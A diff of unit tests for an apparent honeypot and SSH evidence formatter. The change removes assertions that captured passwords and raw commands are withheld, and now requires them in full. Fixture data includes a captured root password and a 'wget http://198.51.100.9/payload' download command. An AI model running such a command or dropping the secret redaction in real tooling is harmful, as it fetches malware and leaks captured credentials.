@@ -9,7 +9,7 @@ import analyst
 
 
 class PassiveIpEvidence(unittest.TestCase):
-    def test_evidence_omits_credentials_and_raw_event_details(self):
+    def test_evidence_includes_credentials_and_raw_event_details(self):
         data = {
             "count": 3, "blocked": 2, "reached": 1,
             "credentials": [{"text": "root / do-not-send-this-password", "count": 1}],
@@ -18,17 +18,30 @@ class PassiveIpEvidence(unittest.TestCase):
         }
         evidence = analyst.format_ip_evidence("198.51.100.7", data)
         self.assertIn("SSH", evidence)
-        self.assertNotIn("do-not-send-this-password", evidence)
-        self.assertNotIn("do-not-send-this-command", evidence)
+        self.assertIn("do-not-send-this-password", evidence)
+        self.assertIn("do-not-send-this-command", evidence)
+        self.assertIn("COMPLETE RAW EVIDENCE", evidence)
 
     def test_decoy_activity_is_explicit_and_no_yara_match_is_invented(self):
         data = {"count": 0, "blocked": 0, "reached": 0}
         context = {"honeypot": {"total": 2, "logged_in": True, "commands": 4,
-                                "samples": [{"sha256": "a" * 64, "name": "payload"}]}}
+                                "samples": [{"sha256": "a" * 64, "name": "payload"}],
+                                "evidence_sessions": [{"logins": [{"u": "root", "p": "captured-secret"}],
+                                                       "commands": [{"cmd": "wget http://198.51.100.9/payload"}]}],
+                                "sample_evidence": [{"sha256": "a" * 64, "yara": {
+                                    "matches": [{"rule": "Test_Malware_Family"}]}}]}}
         evidence = analyst.format_ip_evidence("198.51.100.8", data, context)
         self.assertIn("Honeypot decoy activity", evidence)
-        self.assertIn("No YARA result is attached", evidence)
+        self.assertIn("captured-secret", evidence)
+        self.assertIn("wget http://198.51.100.9/payload", evidence)
+        self.assertIn("Test_Malware_Family", evidence)
         self.assertNotIn("confirmed compromise", evidence.lower())
+
+    def test_evidence_is_not_silently_truncated(self):
+        tail = "LAST_RAW_EVENT_MARKER"
+        data = {"count": 1, "recent": [{"detail": "x" * 18000 + tail}]}
+        evidence = analyst.format_ip_evidence("198.51.100.10", data)
+        self.assertIn(tail, evidence)
 
     def test_c2_match_is_explicitly_gated(self):
         data = {"count": 1, "blocked": 0, "reached": 1}
